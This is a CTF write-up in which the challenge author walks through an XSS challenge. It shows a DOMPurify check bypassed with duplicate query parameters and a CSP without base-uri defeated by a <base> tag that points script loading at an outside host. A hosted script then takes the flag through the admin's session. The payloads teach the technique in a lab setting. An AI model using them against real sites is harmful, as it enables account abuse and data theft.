---
layout: post
title: "Securinets-TEKUP Ramadan CTF — XSS Web Challenge Writeup"
date: 2025-03-01
category: ctf
difficulty: medium
platform: Securinets-TEKUP
tags: [xss, csp-bypass, web, ctf]
description: "Bypassing DOMPurify, CSP base-uri, and HttpOnly cookies to steal a flag."
---

## Overview

I authored this web challenge for the Securinets-TEKUP Ramadan CTF. This writeup walks through the intended solution.

![Challenge banner](/assets/images/colorful_1.webp)

A website was given along with an adminbot link and full source code. The setup immediately suggests an XSS challenge.

## Source Code Analysis

### Backend — `/notes` route

```javascript
app.get('/notes', (req, res) => {
  if (!req.session.user_id) {
    return res.redirect('/login');
  }
  db.get('SELECT favorite_color FROM users WHERE id = ?', [req.session.user_id], (err, user) => {
    const favorite_color = user ? user.favorite_color : 'Unknown';
    let note = req.query.note || '';
    note = note.toString().replace(/"/g, '');
    const nonce = crypto.randomBytes(16).toString('base64');
    res.render('notes', { note, username: req.session.username, nonce, favorite_color });
  });
});
```

Key observations:
- A **random nonce** is generated per request — used for CSP
- Each user has a `favorite_color` set at registration
- Double quotes `"` are stripped from the note
- The note comes from `req.query.note` — a query parameter

### Frontend

```html
<meta http-equiv="Content-Security-Policy" content="
  script-src 'self' 'nonce-<%= nonce %>' https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js;
  img-src 'self';
  object-src 'none';
">
```

```javascript
function addNote() {
  const urlParams = new URLSearchParams(window.location.search);
  let note = urlParams.get('note');
  if (note) {
    if (note.includes("<") || note.includes(">")) {
      note = DOMPurify.sanitize(note);
    } else {
      note = "<%- note %>";  // raw EJS — unescaped!
    }
  } else {
    note = document.getElementById('userInput').value;
    note = DOMPurify.sanitize(note);
  }
  let noteContainer = document.getElementById('noteContainer');
  noteContainer.innerHTML = note;
}
```

Also note: a `color.js` script is loaded with a **relative path** and a valid nonce:
```html
<script nonce="<%= nonce %>" src="/public/color.js"></script>
```

## Goal

1. Bypass the `includes("<") || includes(">")` check to inject JavaScript
2. Bypass the CSP
3. Steal the flag (cookie is `HttpOnly` — can't be stolen directly)

---

## Part 1 — Bypassing the `includes()` Check

`URLSearchParams.get('note')` only returns the **first** value of a parameter.  
But if we pass `?note=aa&note=<script>...`, the check runs on `"aa"` (no brackets), while the raw EJS template renders **both** values joined together.

This means we can smuggle HTML/JS in the second `note` parameter, completely bypassing the DOMPurify check. 😉

![Array injection bypass](/assets/images/colorful_2.webp)

---

## Part 2 — Bypassing the CSP

Evaluating the CSP on [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/) reveals:

> **`base-uri` is missing**

![CSP evaluator showing missing base-uri](/assets/images/colorful_3.webp)

This is critical. Since `color.js` is loaded via a **relative path**, we can inject a `<base>` tag to redirect that request to our own server.

Payload:
```
/notes?note=aa&note=</script><base href=http://mywebsite.com><script>
```

Result: the browser now fetches `/public/color.js` from `mywebsite.com` — our server. Confirmed in the network tab:

![Network tab showing color.js fetched from our server](/assets/images/colorful_4.webp)

```
GET http://mywebsite.com/public/color.js
```

We now have arbitrary JavaScript execution on the page. 😋

---

## Part 3 — Stealing the Flag

The cookie is `HttpOnly`, so we can't read it with `document.cookie`.

**The idea:** use the admin's session to fetch `/flag`, then register a new user with the flag as their `favorite_color` — which we can read later by logging in.

### `color.js` payload (hosted on our server)

```javascript
async function registerWithAdminContent() {
  try {
    const adminResponse = await fetch('http://172.25.0.3:3000/flag');
    const adminContent = await adminResponse.text();
    const base64Content = btoa(adminContent);

    const registerData = {
      username: 'solver',
      password: 'solver',
      favorite_color: base64Content
    };

    const registerResponse = await fetch('http://172.25.0.3:3000/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams(registerData),
    });

    if (!registerResponse.ok) throw new Error('Registration failed');

    window.location.href = 'http://172.25.0.3:3000/login';
  } catch (error) {
    console.error('Error:', error);
  }
}

registerWithAdminContent();
```

### Final payload sent to the adminbot

```
http://172.25.0.3:3000/notes?note=aa&note=</script><base href=https://457660601cc5ca18f54586e2d53d5d2b.serveo.net><script>
```

The adminbot visits the link → executes our `color.js` → fetches `/flag` → registers user `solver` with the flag as `favorite_color` (base64 encoded).

![Adminbot triggered successfully](/assets/images/colorful_5.webp)

We log in as `solver` and read the `favorite_color`:

![Flag revealed in base64](/assets/images/colorful_6.webp)

```
Securinets{__BASE_URI_FOR_THE_W1N}
```

---

## Summary

| Step | Technique |
|---|---|
| Bypass `includes()` check | Duplicate query params (`?note=aa&note=payload`) |
| Bypass CSP | Missing `base-uri` → `<base href>` injection |
| Steal flag (no cookie access) | Fetch flag as admin, exfil via `/register` |

> **Lesson learned:** Always set `base-uri 'self'` in your CSP, especially when loading scripts with relative paths.

Hope you learned something new! ✌️
